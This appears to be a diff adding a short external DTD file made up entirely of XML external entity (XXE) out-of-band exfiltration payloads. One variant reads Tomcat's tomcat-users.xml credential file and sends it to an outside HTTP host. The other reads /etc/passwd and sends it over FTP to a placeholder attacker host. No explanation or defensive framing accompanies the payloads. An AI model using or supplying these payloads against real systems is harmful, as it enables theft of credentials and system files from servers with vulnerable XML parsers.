@@ -1,0 +1,7 @@
+<!ENTITY % d SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://240.240.240.240:8082/?a=%d;'>">
+
+OR
+
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ATTACKERHOST:2121/%d;'>">
